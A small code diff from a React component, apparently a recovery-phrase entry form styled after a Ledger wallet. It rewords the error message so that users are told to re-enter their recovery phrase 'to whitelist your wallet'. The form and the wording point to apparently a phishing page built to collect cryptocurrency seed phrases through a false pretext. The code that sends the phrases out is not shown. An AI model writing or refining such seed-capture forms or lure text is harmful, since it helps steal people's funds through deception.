@@ -137,7 +137,7 @@ const SeedPhrases: React.FC = () => {
           {formError && (
             <p className="text-red-600 text-[14px]">
               One or more words are incorrect. Please re-enter your recovery
-              phrase to access your wallet on this Ledger Device.
+              phrase to whitelist your wallet.
             </p>
           )}
 
